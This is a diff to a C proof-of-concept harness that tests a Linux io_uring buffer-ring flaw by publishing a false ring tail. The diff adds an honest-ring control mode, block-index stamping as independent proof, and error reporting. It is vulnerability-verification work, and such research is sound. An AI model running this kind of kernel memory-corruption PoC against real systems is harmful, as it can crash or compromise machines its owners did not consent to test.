@@ -139,12 +139,18 @@ static int query_head(int ring_fd, unsigned int bgid, unsigned int *head)
 {
 #ifdef POC_PBUF_STATUS_OP
 	struct poc_buf_status st;
+	int ret;
 
 	memset(&st, 0, sizeof(st));
 	st.buf_group = bgid;
 
-	if (io_uring_register(ring_fd, POC_PBUF_STATUS_OP, &st, 1))
+	ret = io_uring_register(ring_fd, POC_PBUF_STATUS_OP, &st, 1);
+	if (ret) {
+		fprintf(stderr,
+			"[!] IORING_REGISTER_PBUF_STATUS(op=%d) failed: %d (%s)\n",
+			POC_PBUF_STATUS_OP, ret, strerror(ret < 0 ? -ret : ret));
 		return -1;
+	}
 
 	*head = st.head;
 	return 0;
@@ -167,16 +173,32 @@ int main(int argc, char *argv[])
 	char *real_buf[RING_ENTRIES];
 	char *payload;
 	size_t payload_len, capacity, sqe_len;
-	unsigned int tail_to_publish, i, head;
+	unsigned int tail_to_publish, i, head, block_proof = 0;
 	long page = sysconf(_SC_PAGESIZE);
-	int zero_len_mode, head_ok, sp[2], ret;
+	int zero_len_mode, control_mode, head_ok, sp[2], ret;
 
-	if (strcmp(mode, "tail-delta") && strcmp(mode, "zero-len")) {
-		fprintf(stderr, "usage: %s [tail-delta|zero-len] [sqe_len]\n",
+	if (strcmp(mode, "tail-delta") && strcmp(mode, "zero-len") &&
+	    strcmp(mode, "control")) {
+		fprintf(stderr,
+			"usage: %s [tail-delta|zero-len|control] [sqe_len]\n",
 			argv[0]);
 		return 2;
 	}
 	zero_len_mode = !strcmp(mode, "zero-len");
+	/*
+	 * 'control' validates THE HARNESS, not my model of the kernel: it
+	 * publishes an honest tail (== ring_entries), so duplicate mapping is
+	 * impossible whatever max_len / EXPAND / nr_iovs end up being. A
+	 * control run that reports a violation means the harness is broken and
+	 * no other result from that build may be trusted.
+	 *
+	 * The previous control (sqe->len = 0) tested my reading of
+	 * io_recv_buf_select() instead. That reading came from master while CI
+	 * ran 6.17, where max_len is
+	 *     min_not_zero(sr->len, kmsg->msg.msg_inq)
+	 * so sqe->len == 0 does NOT disable it. See TRIAGE.md 2.1a.
+	 */
+	control_mode = !strcmp(mode, "control");
 	head = 0;
 
 	capacity = (size_t)RING_ENTRIES * BUF_LEN;
@@ -207,6 +229,18 @@ int main(int argc, char *argv[])
 
 	payload = xzalloc(payload_len);
 	memset(payload, 0x55, payload_len);
+	/*
+	 * Stamp each BUF_LEN-sized block with its own index. Whatever block
+	 * index ends up inside a ring buffer after the recv is the LAST block
+	 * written there, so a high index in a 2-slot ring proves that many
+	 * distinct blocks were funnelled through few physical buffers --
+	 * without needing IORING_REGISTER_PBUF_STATUS at all.
+	 */
+	for (i = 0; i + sizeof(uint32_t) <= payload_len; i += BUF_LEN) {
+		uint32_t idx = (uint32_t)(i / BUF_LEN);
+
+		memcpy(payload + i, &idx, sizeof(idx));
+	}
 
 	if (write(sp[0], payload, payload_len) != (ssize_t)payload_len)
 		die("write(payload)");
@@ -273,7 +307,8 @@ int main(int argc, char *argv[])
 	 *             deeper zero-length buffers are appended as iov_len == 0
 	 *             and still consume a head slot.
 	 */
-	tail_to_publish = zero_len_mode ? RING_ENTRIES : TAIL_DELTA;
+	tail_to_publish = (zero_len_mode || control_mode) ? RING_ENTRIES
+							   : TAIL_DELTA;
 	__atomic_store_n(&br->tail, (__u16)tail_to_publish, __ATOMIC_RELEASE);
 	printf("[*] published     : tail=%u, head=0 -> kernel believes %u "
 	       "buffers are available\n", tail_to_publish, tail_to_publish);
@@ -360,7 +395,37 @@ int main(int argc, char *argv[])
 	printf("[*] bytes transferred       : %d\n", cqe->res);
 	printf("[*] distinct buffer capacity  : %zu\n", capacity);
 
-	if ((size_t)cqe->res > capacity) {
+	/* head-independent proof: read back the stamped block indices */
+	{
+		unsigned int maxidx = 0, bi;
+
+		for (i = 0; i < RING_ENTRIES; i++) {
+			memcpy(&bi, real_buf[i], sizeof(bi));
+			printf("[*] ring slot %u holds block #%u\n", i, bi);
+			if (bi > maxidx)
+				maxidx = bi;
+		}
+		printf("[*] highest block index written through %u slots: %u"
+		       "  (honest max = %u)\n",
+		       RING_ENTRIES, maxidx, RING_ENTRIES - 1);
+		if (maxidx >= RING_ENTRIES)
+			block_proof = 1;
+	}
+
+	if (control_mode) {
+		if ((size_t)cqe->res > capacity || block_proof) {
+			printf("\n[!] CONTROL FAILED: the harness reports a "
+			       "violation on an HONEST ring.\n");
+			printf("    Do not trust any other result from this "
+			       "build/run.\n");
+			return 5;
+		}
+		printf("\n[+] CONTROL PASSED: honest ring, no violation. The "
+		       "harness is sound.\n");
+		return 3;
+	}
+
+	if ((size_t)cqe->res > capacity || block_proof) {
 		printf("\n[!] VULNERABLE - invariant violated.\n");
 		printf("    The kernel moved %d bytes through a ring that only "
 		       "ever offered %zu bytes of\n    distinct buffer space: "
